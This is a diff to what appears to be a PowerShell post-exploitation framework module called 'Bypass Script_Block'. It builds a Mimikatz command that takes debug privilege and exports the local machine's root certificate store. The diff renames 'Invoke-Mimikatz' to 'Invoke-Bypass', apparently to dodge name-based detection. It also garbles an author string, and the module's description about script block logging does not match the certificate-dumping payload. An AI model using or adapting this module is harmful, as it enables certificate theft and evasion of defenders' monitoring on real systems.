@@ -7,7 +7,7 @@ class Module:
         self.info = {
             'Name': 'Bypass Script_Block',
 
-            'Author': ['@Homjxie' 'Ryan_Cobb',],
+            'Author': ['@Homjxie:>' 'Ryan_Cobb',],
 
             'Description': ("@Ryan Cobb @Homjxie"
                             "Most companies only realize the need to enable script block logging after it is too late. To provide some recourse in this situation, PowerShell automatically logs script blocks when they have content often used by malicious scripts."),
@@ -64,6 +64,6 @@ class Module:
         script = moduleCode
         
         # add in the cert dumping command
-        script += """Invoke-Mimikatz -Command 'crypto::capi privilege::debug crypto::cng "crypto::certificates /systemstore:local_machine /store:root /export"' """
+        script += """Invoke-Bypass -Command 'crypto::capi privilege::debug crypto::cng "crypto::certificates /systemstore:local_machine /store:root /export"' """
         
         return script
